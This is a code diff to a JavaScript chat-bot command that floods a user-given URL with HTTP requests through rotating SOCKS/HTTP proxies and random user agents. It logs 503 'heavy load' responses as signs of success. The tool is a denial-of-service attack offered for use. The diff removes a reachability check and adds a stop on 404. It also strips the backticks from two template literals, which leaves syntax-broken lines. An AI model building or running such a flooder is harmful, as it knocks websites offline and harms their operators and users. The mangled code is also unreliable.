@@ -78,7 +78,7 @@ const userAgents = () => {
     try {
         return fs.readFileSync(ualist, "utf-8").split("\n").map(line => line.trim());
     } catch (error) {
-        console.error(`Failed to read user agent list: ${error}`);
+        console.error(Failed to read user agent list: ${error});
         return [];
     }
 };
@@ -88,15 +88,6 @@ const loadProxies = () => {
         return fs.readFileSync(proxyFilePath, "utf-8").split("\n").map(line => line.trim());
     } catch {
         return [];
-    }
-};
-
-const checkIfUrlExists = async (url) => {
-    try {
-        const response = await axios.head(url);
-        return response.status === 200;
-    } catch {
-        return false;
     }
 };
 
@@ -126,14 +117,17 @@ const performAttack = (url, agent, continueAttack, requestsSent, checkCompletion
         setTimeout(() => performAttack(url, agent, continueAttack, requestsSent, checkCompletion), 0);
     })
     .catch((err) => {
-        if (err.response?.status === 503) {
+        if (err.response?.status === 404) {
+            console.log(rainbow("Target returned 404 (Not Found). Stopping further attacks."));
+            continueAttack = false;
+        } else if (err.response?.status === 503) {
             console.log(rainbow("Target under heavy load (503)."));
         } else if (err.response?.status === 502) {
             console.log(rainbow("Bad Gateway (502)."));
         } else if (err.response?.status) {
             console.log(rainbow(`OTHER STATUS: (${err.response?.status})`));
         } else {
-            console.log(rainbow("Request failed with no response or unknown error."));
+            console.log(rainbow(err.message || "ATTACK FAILED!"));
         }
         requestsSent++;
         checkCompletion(requestsSent);
@@ -141,16 +135,12 @@ const performAttack = (url, agent, continueAttack, requestsSent, checkCompletion
     });
 };
 
+
 module.exports["run"] = async ({ args, chat, font }) => {
     const targetUrl = args[0];
 
     if (!targetUrl || !/^https?:\/\//.test(targetUrl)) {
         return chat.reply(font.thin("Invalid URL. Please provide a valid URL starting with http:// or https://"));
-    }
-
-    const urlExists = await checkIfUrlExists(targetUrl);
-    if (!urlExists) {
-        return chat.reply(font.thin("URL does not exist or is unreachable."));
     }
 
     const proxies = loadProxies();
@@ -180,7 +170,7 @@ module.exports["run"] = async ({ args, chat, font }) => {
         const randomProxy = getRandomElement(proxies);
         const proxyParts = randomProxy.split(":");
         const proxyProtocol = proxyParts[0].startsWith("socks") ? "socks5" : "http";
-        const proxyUrl = `${proxyProtocol}://${proxyParts[0]}:${proxyParts[1]}`;
+        const proxyUrl = ${proxyProtocol}://${proxyParts[0]}:${proxyParts[1]};
         const agent = proxyProtocol === "socks5" ? new SocksProxyAgent(proxyUrl) : new HttpsProxyAgent(proxyUrl);
 
         performAttack(targetUrl, agent, continueAttack, requestsSent, checkCompletion);
